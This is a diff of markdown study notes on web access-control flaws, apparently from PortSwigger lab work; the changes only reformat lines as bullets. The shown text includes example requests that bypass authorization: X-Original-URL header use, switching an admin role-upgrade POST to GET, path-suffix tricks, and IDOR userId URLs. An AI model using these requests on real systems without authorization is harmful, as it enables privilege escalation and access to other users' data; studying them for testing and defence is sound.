@@ -57,7 +57,7 @@ X-Original-URL: /admin/action
 ```
 # HTTP-Method based controls 
 - This can be done manually or Burp Suites tool "Change request method"
-FROM
+- FROM
 ```http
 POST /admin-roles HTTP/2
 Host: uuid.web-security-academy.net
@@ -65,7 +65,7 @@ Host: uuid.web-security-academy.net
 
 username=carlos&action=upgrade
 ```
-TO
+- TO
 ```http
 GET /admin-roles?username=wiener&action=upgrade HTTP/2
 Host: uuid.web-security-academy.net
@@ -80,9 +80,9 @@ site.com/secret/ –> HTTP 200 OK
 site.com/secret/. –> HTTP 200 OK
 ```
 # IDORS
-Insecure direct object reference
-`https://mydomain.com/balance?userId=33`
-`https://mydomain.com/balance?userId=uuid`
+- Insecure direct object reference
+- `https://mydomain.com/balance?userId=33`
+- `https://mydomain.com/balance?userId=uuid`
 # Vulnerability in multi-step processes
 - An action might be performed and the implementation requires several steps (requests)
     - Step 1 (access control in place)
